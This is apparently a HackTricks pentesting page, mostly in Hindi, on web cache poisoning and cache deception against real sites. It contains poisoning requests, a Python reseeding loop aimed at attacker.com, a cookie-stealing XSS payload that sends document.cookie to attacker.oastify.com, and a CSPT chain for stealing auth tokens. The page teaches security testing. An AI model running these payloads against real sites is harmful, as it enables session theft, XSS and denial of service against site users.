# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## अंतर

> **web cache poisoning और web cache deception में क्या अंतर है?**
>
> - In **web cache poisoning**, हमलावर एप्लिकेशन को cache में कुछ malicious content स्टोर करवाता है, और यह content cache से अन्य एप्लिकेशन उपयोगकर्ताओं को सर्व किया जाता है।
> - In **web cache deception**, हमलावर एप्लिकेशन को किसी अन्य उपयोगकर्ता का कुछ sensitive content cache में स्टोर करवाता है, और फिर हमलावर उस content को cache से प्राप्त कर लेता है।

## Cache Poisoning

Cache poisoning का लक्ष्य client-side cache को manipulate करना है ताकि क्लाइंट उन resources को लोड करने के लिए मजबूर हों जो अप्रत्याशित, आंशिक, या एक हमलावर के नियंत्रण में हों। प्रभाव की सीमा प्रभावित पेज की लोकप्रियता पर निर्भर करती है, क्योंकि संक्रमित response केवल उसी अवधि के दौरान पेज पर आने वाले उपयोगकर्ताओं को परोसा जाता है जब cache प्रदूषित होता है।

Cache poisoning assault के कार्यान्वयन में कई कदम शामिल होते हैं:

1. **Unkeyed Inputs की पहचान**: ये वे parameters हैं जो, भले ही किसी request को cache करने के लिए आवश्यक न हों, फिर भी server द्वारा लौटाए जाने वाले response को बदल सकते हैं। इन inputs की पहचान महत्वपूर्ण है क्योंकि इन्हें cache को manipulate करने के लिए exploit किया जा सकता है।
2. **Unkeyed Inputs का शोषण**: Unkeyed inputs की पहचान के बाद अगला कदम यह पता लगाना है कि इन parameters का दुरुपयोग कैसे किया जाए ताकि server के response को हमलावर के लाभ के अनुसार बदला जा सके।
3. **यह सुनिश्चित करना कि Poisoned Response cache में स्टोर हो**: अंतिम कदम यह सुनिश्चित करना है कि बदला गया response cache में स्टोर हो। इस तरह, जब cache poisoned है, प्रभावित पेज पर आने वाला कोई भी उपयोगकर्ता संक्रमित response प्राप्त करेगा।

### खोज: HTTP headers की जाँच

आम तौर पर, जब कोई response **stored in the cache** किया गया होता है तो वहां एक **ऐसा header** होता है जो इसे इंगित करता है, आप देख सकते हैं कि किन headers पर आपको ध्यान देना चाहिए इस पोस्ट में: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### खोज: Error codes का cache होना

यदि आपको लगता है कि response cache में स्टोर हो रहा है, तो आप **गलत header के साथ requests भेजकर** देख सकते हैं, जिनका उत्तर सामान्यत: **status code 400** होना चाहिए। फिर उस request को सामान्य रूप से एक्सेस करके देखें — यदि **response 400 status code** है, तो आप जान गए कि यह vulnerable है (और आप यहाँ तक कि DoS भी कर सकते हैं)।

आप और विकल्प यहाँ पा सकते हैं:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

हालाँकि, ध्यान दें कि **कभी-कभी इस तरह के status codes cache नहीं किए जाते** इसलिए यह परीक्षण भरोसेमंद नहीं हो सकता।

### खोज: Unkeyed inputs की पहचान और मूल्यांकन

आप [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) का उपयोग उन parameters और headers को brute-force करने के लिए कर सकते हैं जो पेज के response को बदल रहे हों। उदाहरण के लिए, एक पेज header `X-Forwarded-For` का उपयोग करके client को संकेत दे सकता है कि वहां से script लोड करे:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### बैकएंड सर्वर से हानिकारक प्रतिक्रिया उत्पन्न करें

पहचान किए गए पैरामीटर/हेडर के साथ यह जांचें कि इसे कैसे **सैनिटाइज़** किया जा रहा है और यह **कहाँ** प्रतिक्रिया में **परावर्तित** हो रहा है या हेडर से कैसे प्रभावित कर रहा है। क्या आप इसे फिर भी दुरुपयोग कर सकते हैं (एक XSS करवा सकते हैं या अपने नियंत्रित JS कोड को लोड करवा सकते हैं? DoS करवा सकते हैं?...)

### प्रतिक्रिया को कैश करें

एक बार जब आपने वह **पृष्ठ** पहचान लिया हो जिसे दुरुपयोग किया जा सकता है, कौन सा **पैरामीटर**/**हेडर** इस्तेमाल करना है और **कैसे** इसे **दुरुपयोग** करना है, तो आपको उस पेज को कैश करवाना होगा। जिस resource को आप कैश में डालने की कोशिश कर रहे हैं उसके अनुसार यह कुछ समय ले सकता है; आपको कुछ सेकंड तक लगातार कोशिश करनी पड़ सकती है।

रिस्पॉन्स में हेडर **`X-Cache`** बहुत उपयोगी हो सकता है क्योंकि इसमें मान **`miss`** हो सकता है जब request cached नहीं थी और मान **`hit`** जब यह cached है।\
हेडर **`Cache-Control`** भी यह जानने के लिए महत्वपूर्ण है कि कोई resource cache हो रहा है या नहीं और अगली बार वह कब फिर से cache होगा: `Cache-Control: public, max-age=1800`

एक और दिलचस्प हेडर है **`Vary`**। यह हेडर अक्सर अतिरिक्त हेडरों को **इशारा करने** के लिए इस्तेमाल होता है जिन्हें सामान्यतः unkeyed होते हुए भी **cache key का हिस्सा** माना जाता है। इसलिए, अगर attacker को उसके लक्षित victim का `User-Agent` पता है, तो वह उस विशिष्ट `User-Agent` वाले उपयोगकर्ताओं के लिए cache को poison कर सकता है।

cache से संबंधित एक और हेडर है **`Age`**। यह सेकंड में बताता है कि ऑब्जेक्ट proxy cache में कितने समय से रखा हुआ है।

जब आप किसी request को cache कर रहे हों, तो **आप जिन हेडरों का उपयोग करते हैं उनके प्रति सावधान रहें** क्योंकि कुछ हेडर अनपेक्षित रूप से **cache key में शामिल** हो सकते हैं और **लक्षित उपयोगकर्ता को वही हेडर इस्तेमाल करना होगा**। हमेशा Cache Poisoning को **विभिन्न ब्राउज़रों** के साथ **टेस्ट** करें यह जांचने के लिए कि यह काम कर रहा है या नहीं।

### बुनियादी cache poisoning केस स्टडीज़

#### HackerOne का global redirect via `X-Forwarded-Host`

- Origin ने `X-Forwarded-Host` का उपयोग करते हुए templated redirects और canonical URLs बनाए, लेकिन cache key केवल `Host` हेडर का उपयोग कर रहा था, इसलिए एक ही response ने `/` के हर विज़िटर का cache poison कर दिया।
- Poison with:
```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```
- तुरंत `/` को spoofed header के बिना फिर से रिक्वेस्ट करें; अगर redirect बना रहता है तो आपके पास एक global host-spoofing primitive है जो अक्सर reflected redirects/Open Graph links को stored issues में अपग्रेड कर देता है।

#### GitHub repository DoS via `Content-Type` + `PURGE`

- Anonymous traffic केवल path पर keyed थी, जबकि backend ने एक error state में प्रवेश कर लिया जब उसने एक unexpected `Content-Type` देखा। वह error response किसी भी unauthenticated user of a repo के लिए cacheable था।
- GitHub ने (गलती से) `PURGE` verb को भी मान्यता दी, जिससे attacker एक healthy entry को flush कर सकता था और caches को मजबूर कर सकता था कि वे मांग पर poisoned variant को pull करें:
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```
- हमेशा authenticated vs anonymous cache keys की तुलना करें, कम-बार keyed headers जैसे `Content-Type` को fuzz करें, और exposed cache-maintenance verbs के लिए probe करें ताकि re-poisoning को automate किया जा सके।

#### Shopify cross-host persistence loops

- Multi-layer caches कभी-कभी नया object commit करने से पहले कई identical hits की आवश्यकता होती है।
- Shopify ने अनेक localized hosts में वही cache reuse किया, इसलिए persistence का मतलब कई properties पर असर था।
- छोटे automation loops का उपयोग करके बार-बार reseed करें:
```python
import requests, time
for i in range(100):
requests.get("https://shop.shopify.com/endpoint",
headers={"X-Forwarded-Host": "attacker.com"})
time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```
- `hit` response के बाद, समान cache namespace साझा करने वाले अन्य hosts/assets को crawl करें ताकि cross-domain blast radius प्रदर्शित किया जा सके।

#### JS asset redirect → stored XSS chain

- Private programs अक्सर साझा JS जैसे `/assets/main.js` को दर्जनों subdomains पर host करते हैं। यदि `X-Forwarded-Host` उन assets के redirect logic को प्रभावित करता है लेकिन unkeyed है, cached response attacker JS के लिए 301 बन जाता है, जिससे asset import होने वाली हर जगह stored XSS उत्पन्न होती है।
```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- यह मैप करें कि कौन से hosts वही asset path reuse करते हैं ताकि आप multi-subdomain compromise साबित कर सकें।

#### GitLab static DoS के माध्यम से `X-HTTP-Method-Override`

- GitLab ने Google Cloud Storage से static bundles परोसे, जो `X-HTTP-Method-Override` को मानता है। GET को HEAD में override करने पर cacheable `200 OK` with `Content-Length: 0` लौटा, और edge cache ने key generate करते समय HTTP method को ignore कर दिया।
```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
- एक ही अनुरोध ने हर GET के लिए JS bundle को खाली बॉडी से बदल दिया, जिससे प्रभावी रूप से UI DoSing हो गया। हमेशा method overrides (`X-HTTP-Method-Override`, `X-Method-Override`, आदि) को static assets के खिलाफ टेस्ट करें और पुष्टि करें कि cache method के अनुसार बदलता है या नहीं।

#### HackerOne static asset loop `X-Forwarded-Scheme` के माध्यम से

- Rails’ Rack middleware ने `X-Forwarded-Scheme` पर भरोसा किया कि HTTPS लागू किया जाए या नहीं। `/static/logo.png` के खिलाफ `http` को spoof करने पर एक cacheable 301 ट्रिगर हुआ, जिससे बाद में सभी उपयोगकर्ताओं को asset के बजाय redirects (या loops) प्राप्त हुए:
```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```
- संभव होने पर scheme spoofing को host spoofing के साथ मिलाएँ ताकि highly visible resources के लिए irreversible redirects तैयार किए जा सकें।

#### Cloudflare host-header casing mismatch

- Cloudflare ने cache keys के लिए `Host` header को सामान्यीकृत किया लेकिन raw casing को origins पर फॉरवर्ड किया। `Host: TaRgEt.CoM` भेजने पर origin routing/templating में वैकल्पिक व्यवहार उत्पन्न हुआ, जबकि canonical lowercase cache bucket फिर भी भरा जा रहा था।
```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```
- mixed-case hosts (और other normalized headers) को replay करके CDN tenants को enumerate करें और cached response तथा origin response का diff लेकर shared-platform cache poisonings का पता लगाएँ।

#### Red Hat Open Graph meta poisoning

- Injecting `X-Forwarded-Host` inside Open Graph tags ने reflected HTML injection को stored XSS में बदल दिया जब CDN ने पेज को cache कर लिया। टेस्टिंग के दौरान production users को नुकसान पहुँचाने से बचने के लिये harmless cache buster का उपयोग करें:
```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```
- Social media scrapers cached Open Graph tags को consume करते हैं, इसलिए एक single poisoned entry payload सीधे visitors से कहीं अधिक लोगों तक फैल जाता है।

## Exploiting Examples

### सबसे आसान उदाहरण

A header like `X-Forwarded-For` is being reflected in the response unsanitized.\
You can send a basic XSS payload and poison the cache so everybody that accesses the page will be XSSed:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Note that this will poison a request to `/en?region=uk` not to `/en`_

### Cache poisoning से DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning के माध्यम से CDNs

इस **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** में निम्नलिखित सरल परिदृश्य समझाया गया है:

- CDN `/share/` के अंतर्गत किसी भी चीज़ को cache करेगा
- CDN `%2F..%2F` को decode या normalize नहीं करेगा, इसलिए इसे **path traversal to access other sensitive locations that will be cached** के रूप में उपयोग किया जा सकता है, जैसे `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- वेब सर्वर `%2F..%2F` को decode और normalize करेगा, और `/api/auth/session` के साथ प्रतिक्रिया देगा, जिसमें **auth token होता है**।

### web cache poisoning का उपयोग करके cookie-handling vulnerabilities का शोषण

Cookies किसी पेज के response में भी प्रतिबिंबित हो सकते हैं। यदि आप इसका दुरुपयोग करके उदाहरण के लिए XSS पैदा कर सकें, तो आप दुष्ट cache response लोड करने वाले कई clients में XSS को exploit कर सकेंगे।
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Note that if the कमजोर cookie उपयोगकर्ताओं द्वारा बहुत अधिक इस्तेमाल की जाती है, तो नियमित अनुरोध cache को साफ़ कर देंगे।

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

देखें:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning path traversal के जरिए API key चुराने के लिए <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**यह writeup बताता है**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) कि किस तरह `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` जैसे URL से एक OpenAI API key चुराना संभव था, क्योंकि `/share/*` से मेल खाने वाली कोई भी चीज़ Cloudflare द्वारा URL को सामान्यीकृत किए बिना cache की जाएगी, जबकि अनुरोध web server तक पहुँचने पर URL सामान्यीकृत किया जाता था।

यह नीचे बेहतर तरीके से भी समझाया गया है:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

कभी-कभी cache को abuse करने के लिए आपको **exploit several unkeyed inputs** की आवश्यकता होगी। उदाहरण के लिए, आप एक **Open redirect** पा सकते हैं अगर आप `X-Forwarded-Host` को अपनी नियंत्रित डोमेन पर सेट करते हैं और `X-Forwarded-Scheme` को `http` पर सेट करते हैं। **If** the **server** is **forwarding** all the **HTTP** requests **to HTTPS** और redirect के लिए डोमेन नाम के रूप में header `X-Forwarded-Scheme` का उपयोग कर रहा है। आप redirect के जरिए नियंत्रित कर सकते हैं कि पेज कहाँ निर्देशित होगा।
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### सीमित `Vary`header का शोषण

यदि आप पाते हैं कि **`X-Host`** header का उपयोग **domain name to load a JS resource** के रूप में किया जा रहा है, लेकिन response में **`Vary`** header संकेत कर रहा है **`User-Agent`**। तो आपको पीड़ित के `User-Agent` को exfiltrate करने और उस `User-Agent` का उपयोग करके cache को poison करने का तरीका ढूँढना होगा:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

URL और body दोनों में वही request डालकर GET request भेजें।  
अगर web server body वाला इस्तेमाल करता है लेकिन cache server URL वाला cache कर देता है, तो कोई भी उस URL को एक्सेस करने पर वास्तव में body से parameter का उपयोग करेगा।  
जैसा कि Github वेबसाइट पर James Kettle द्वारा पाया गया vuln:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There it a Portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

उदाहरण के लिए, ruby servers में **parameters** को अलग करने के लिए कैरेक्टर **`;`** का उपयोग **`&`** की बजाय संभव है। इसे unkeyed parameters के values को keyed ones के अंदर डालने और दुरुपयोग करने के लिए इस्तेमाल किया जा सकता है।

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

यहाँ सीखें कि कैसे [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

The [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) को स्वचालित रूप से web cache poisoning के लिए टेस्ट करने में इस्तेमाल किया जा सकता है। यह कई अलग-अलग techniques को सपोर्ट करता है और highly customizable है।

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

यह real-world pattern एक header-based reflection primitive को CDN/WAF व्यवहार के साथ जोड़ता है ताकि अन्य उपयोगकर्ताओं को सर्व किए जाने वाले cached HTML को विश्वसनीय तरीके से poison किया जा सके:

- मुख्य HTML ने एक अनट्रस्टेड request header (उदा., `User-Agent`) को executable context में reflect किया।
- CDN ने cache headers को strip कर दिया था लेकिन एक internal/origin cache मौजूद था। CDN उन requests को भी auto-cache करता था जो static extensions (उदा., `.js`) पर समाप्त होते हैं, जबकि WAF ने static assets के लिए GETs पर कमजोर content inspection लागू की थी।
- Request flow की quirks ने `.js` path की एक request को subsequent main HTML के लिए उपयोग किए जाने वाले cache key/variant को प्रभावित करने की अनुमति दी, जिससे header reflection के जरिए cross-user XSS संभव हुआ।

Practical recipe (observed across a popular CDN/WAF):

1) साफ़ IP से (पूर्व reputation-based downgrades से बचें), ब्राउज़र या Burp Proxy Match & Replace के जरिए एक malicious `User-Agent` सेट करें।  
2) Burp Repeater में, दो requests का एक समूह तैयार करें और "Send group in parallel" का उपयोग करें (single-packet mode सबसे अच्छा काम करता है):
- First request: उसी origin पर `.js` resource path को GET करें जबकि आप malicious `User-Agent` भेज रहे हों।
- Immediately after: मुख्य पेज (`/`) को GET करें।  
3) CDN/WAF routing race और auto-cached `.js` अक्सर एक poisoned cached HTML variant को seed करते हैं जो फिर समान cache key conditions (उदा., समान `Vary` आयाम जैसे `User-Agent`) साझा करने वाले अन्य विज़िटर्स को सर्व किया जाता है।

Example header payload (to exfiltrate non-HttpOnly cookies):
```http
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational टिप्स:

- Many CDNs hide cache headers; poisoning may appear only on multi-hour refresh cycles. Use multiple vantage IPs and throttle to avoid rate-limit or reputation triggers.
- Using an IP from the CDN's own cloud sometimes improves routing consistency.
- If a strict CSP is present, this still works if the reflection executes in main HTML context and CSP allows inline execution or is bypassed by context.

प्रभाव:

- यदि session cookies aren’t `HttpOnly`, zero-click ATO is possible by mass-exfiltrating `document.cookie` from all users who are served the poisoned HTML.


### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

A Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:
```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
This attacker‑chosen cache key के अंतर्गत arbitrary HTML लिखता है, जिससे cache keys ज्ञात होने पर precise poisoning संभव हो जाता है।

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## कमजोर उदाहरण

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS ने URL के अंदर fragment को बिना हटाए आगे भेजा और cache key केवल host, path and query का उपयोग करके तैयार किया (fragment को नजरअंदाज करते हुए)। इसलिए request `/#/../?r=javascript:alert(1)` backend को `/#/../?r=javascript:alert(1)` के रूप में भेजा गया और cache key में payload नहीं था, केवल host, path and query थे।

### 403 and Storage Buckets

Cloudflare पहले 403 responses को cache करता था। गलत Authorization headers के साथ S3 या Azure Storage Blobs तक पहुँचने का प्रयास करने पर 403 response आता था जो cache हो जाता था। हालाँकि Cloudflare ने 403 responses को cache करना बंद कर दिया है, यह व्यवहार अन्य proxy सेवाओं में अभी भी मौजूद हो सकता है।

### Injecting Keyed Parameters

Caches अक्सर cache key में specific GET parameters शामिल करते हैं। उदाहरण के लिए, Fastly's Varnish ने requests में `size` parameter को cache किया। हालांकि, अगर parameter का URL-encoded संस्करण (जैसे `siz%65`) भी गलत value के साथ भेजा गया, तो cache key सही `size` parameter का उपयोग करके बनाया जाता था। फिर भी, backend URL-encoded parameter की value को process करता था। दूसरे `size` parameter को URL-encode करने से cache में वह omission हो जाती थी पर backend इसे उपयोग कर लेता था। इस parameter को 0 देने से cacheable 400 Bad Request error मिलती थी।

### User Agent Rules

कुछ developers high-traffic tools जैसे FFUF या Nuclei के user-agents से मेल खाने वाली requests को server load manage करने के लिए block करते हैं। Ironically, यह तरीका cache poisoning और DoS जैसी vulnerabilities पैदा कर सकता है।

### Illegal Header Fields

[https://datatracker.ietf.mrg/doc/html/rfc7230](https://datatracker.ietf.mrg/doc/html/rfc7230) header names में स्वीकार्य characters को निर्दिष्ट करता है। जो headers निर्दिष्ट **tchar** range के बाहर के characters रखते हैं उन्हें आदर्श रूप से 400 Bad Request response देना चाहिए। व्यवहार में servers हमेशा इस मानक का पालन नहीं करते। एक उल्लेखनीय उदाहरण Akamai का है, जो invalid characters वाले headers को forward करता है और कोई भी 400 error cache कर देता है, बशर्ते कि `cache-control` header मौजूद न हो। एक exploitable पैटर्न पाया गया जहां `\` जैसे illegal character वाला header भेजने पर cacheable 400 Bad Request error बन जाती थी।

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception यह है कि clients ऐसे resources **load** करें जो cache द्वारा उनके संवेदनशील जानकारी के साथ सेव किए जाने वाले हैं।

सबसे पहले ध्यान दें कि **extensions** जैसे `.css`, `.js`, `.png` आदि सामान्यतः **configured** होते हैं ताकि वे **saved** हों **cache** में। इसलिए, अगर आप `www.example.com/profile.php/nonexistent.js` को access करते हैं तो cache शायद response को store कर देगी क्योंकि यह `.js` **extension** को देखती है। लेकिन, अगर **application** _www.example.com/profile.php_ में स्टोर संवेदनशील user contents के साथ **replaying** कर रही है, तो आप उन contents को अन्य users से **steal** कर सकते हैं।

अन्य चीजें टेस्ट करने के लिए:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

एक और बहुत स्पष्ट उदाहरण इस write-up में मिल सकता है: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
उदाहरण में बताया गया है कि अगर आप non-existent पेज जैसे _http://www.example.com/home.php/non-existent.css_ लोड करते हैं तो _http://www.example.com/home.php_ का content (**with the user's sensitive information**) लौटाया जाएगा और cache server उस result को save कर लेगा।\
फिर, **attacker** अपने ब्राउज़र में _http://www.example.com/home.php/non-existent.css_ को access कर सकता है और उन users की **confidential information** देख सकता है जिन्होंने पहले access किया था।

ध्यान दें कि **cache proxy** को फाइलों को उनकी फ़ाइल **extension** (_.css_) के आधार पर **cache** करने के लिए **configured** होना चाहिए, न कि content-type के आधार पर। उदाहरण में _http://www.example.com/home.php/non-existent.css_ का content-type `text/html` होगा न कि `text/css` mime type।

Learn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

### CSPT-assisted authenticated cache poisoning (Account Takeover)

यह pattern एक Single-Page App (SPA) में Client-Side Path Traversal (CSPT) primitive को extension-based CDN caching के साथ जोड़ता है ताकि सार्वजनिक रूप से संवेदनशील JSON cache हो सके, जो मूलतः केवल authenticated API कॉल पर उपलब्ध था।

High level idea:

- एक संवेदनशील API endpoint को custom auth header की आवश्यकता होती है और origin पर सही ढंग से non-cacheable mark किया गया होता है।
- एक static-सा suffix (उदाहरण के लिए, .css) जोड़ने से CDN path को static asset की तरह मानकर response को cache कर देता है, अक्सर sensitive headers पर vary किए बिना।
- SPA में CSPT होता है: यह एक user-controlled path segment को API URL में जोड़ता है जबकि victim के auth header (उदाहरण के लिए, X-Auth-Token) को attach करता है। ../.. traversal inject करने पर, authenticated fetch cacheable path variant (…/v1/token.css) पर redirect हो जाती है, जिससे CDN victim के token JSON को public key के तहत cache कर देता है।
- फिर कोई भी बिना authentication के उसी cache key को GET कर सकता है और victim का token प्राप्त कर सकता है।

Example

- Sensitive endpoint (non-cacheable at origin):
```
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache: Miss from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- स्टैटिक दिखने वाला suffix CDN को cacheable बना देता है:
```
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- SPA में CSPT auth header जोड़ता है और traversal की अनुमति देता है:
```js
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');

const apiUrl = `https://api.example.com/v1/users/info/${userId}`;

fetch(apiUrl, {
method: 'GET',
headers: { 'X-Auth-Token': authToken }
});
```
- एक्सप्लॉइट चेन:
1. शिकार को ऐसे URL पर लुभाएँ जो SPA path parameter में dot-segments इंजेक्ट करता है, उदाहरण:
- [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)
2. SPA एक authenticated fetch जारी करता है:
- [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)
3. Browser normalization इसे resolve कर देता है:
- [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)
4. CDN .css को एक static asset मानता है और JSON को Cache-Control: public, max-age=... के साथ cache कर देता है।
5. Public retrieval: कोई भी https://api.example.com/v1/token.css को GET करके cached token JSON प्राप्त कर सकता है।

पूर्व शर्तें

- SPA same API origin (या cross-origin with working CORS) पर authenticated fetch/XHR करता है और sensitive headers या bearer tokens attach करता है।
- Edge/CDN extension-based caching लागू करता है static-looking paths (उदा., *.css, *.js, images) के लिए और cache key को sensitive header पर vary नहीं करता।
- base endpoint का origin non-cacheable होना (सही) चाहिए, पर extension-suffixed variant को allow किया गया है या edge rules द्वारा block नहीं किया गया है।

वैलिडेशन चेकलिस्ट

- सेंसिटिव dynamic endpoints की पहचान करें और .css, .js, .jpg, .json जैसे suffixes आज़माएँ। Cache-Control: public/max-age और X-Cache: Hit (या समकक्ष, जैसे CF-Cache-Status) की तलाश करें जबकि content JSON ही बना रहे।
- उस client code को खोजें जो user-controlled input को API paths में concatenate करता है जबकि auth headers attach करता है। ../ sequences inject करें ताकि authenticated request को आपके target endpoint पर redirect किया जा सके।
- पुष्टि करें कि authenticated header retargeted request पर मौजूद है (उदा., proxy में या server-side logs के जरिए) और कि CDN response को traversed path के तहत cache कर रहा है।
- एक fresh context (कोई auth नहीं) से उसी path को request करें और पुष्टि करें कि secret JSON cache से serve हो रहा है।

## ऑटोमैटिक टूल्स

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner जो URL की सूची में web cache poisoning vulnerabilities ढूँढता है और multiple injection techniques टेस्ट करता है।

## संदर्भ

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
